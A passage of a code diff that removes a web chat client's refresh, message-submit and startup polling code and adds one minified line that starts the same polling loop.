-  const container = document.getElementById('messagesContainer');
-  if (container) {
-    container.scrollTop = container.scrollHeight;
-    unreadCount = 0;
-    updateNewMessagesButton();
-  }
-});
-
-// ---- refresh chat ----
-async function refreshChat() {
-  const btn = document.getElementById('refreshChatBtn');
-  if (btn) {
-    btn.textContent = '⏳ Refreshing…';
-    btn.disabled = true;
-  }
-
-  messagesMap.clear();
-  messageEls.clear();
-  lastSync = null;
-  unreadCount = 0;
-  editingMessageId = null;
-  updateNewMessagesButton();
-
-  const container = document.getElementById('messagesContainer');
-  if (container) container.innerHTML = '';
-
-  try {
-    const res = await fetch('/api/messages');
-    if (!res.ok) throw new Error('Refresh failed');
-    const msgs = await res.json();
-    msgs.forEach(m => messagesMap.set(m.id, m));
-    syncMessages(true);
-    const sorted = msgs.sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp));
-    lastSync = sorted.length > 0 ? sorted[sorted.length - 1].timestamp : new Date().toISOString();
-  } catch (err) {
-    console.error('Refresh error:', err);
-    alert('Failed to refresh chat. Please try again.');
-  } finally {
-    if (btn) {
-      btn.innerHTML = '<span>🔄</span> Refresh';
-      btn.disabled = false;
-    }
-  }
-}
-document.getElementById('refreshChatBtn')?.addEventListener('click', refreshChat);
-
-// ---- form submit ----
-document.getElementById('messageForm').addEventListener('submit', e => {
-  e.preventDefault();
-  const input = document.getElementById('messageInput');
-  const text = input.value.trim();
-  if (!text) return;
-  sendMessage(text, replyToId);
-  input.value = '';
-  cancelReply();
-});
-
-document.getElementById('cancelReply')?.addEventListener('click', cancelReply);
-document.getElementById('emojiBtn')?.addEventListener('click', () => {
-  alert('Emoji picker coming soon!');
-});
-
-// ---- start ----
-loadInitial().finally(() => {
-  setInterval(poll, 500);
-});
+LI().finally(()=>{setInterval(POLL,500);});
